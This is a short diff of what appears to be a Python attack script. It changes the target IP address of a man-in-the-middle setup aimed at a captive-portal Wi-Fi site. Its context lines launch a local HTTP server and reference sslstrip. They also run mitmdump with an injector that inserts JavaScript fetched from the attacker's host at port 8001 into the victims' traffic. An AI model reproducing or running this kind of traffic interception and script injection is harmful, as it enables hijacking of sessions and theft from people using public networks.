@@ -50,7 +50,7 @@ os.system("python3 httpServer.py &")
 #os.system("sslstrip -l 8080 &")
 
 #site = "captive\-portal\.mav\-start\.hu"
-site = "212\.91\.30\.199"
+site = "212\.92\.30\.199"
 
 # start the mitmproxy
 os.system("mitmdump --ignore '^(?!"+ site +")' -s 'injector.py http://" + attacker_ip + ":8001/script.js' -T") 
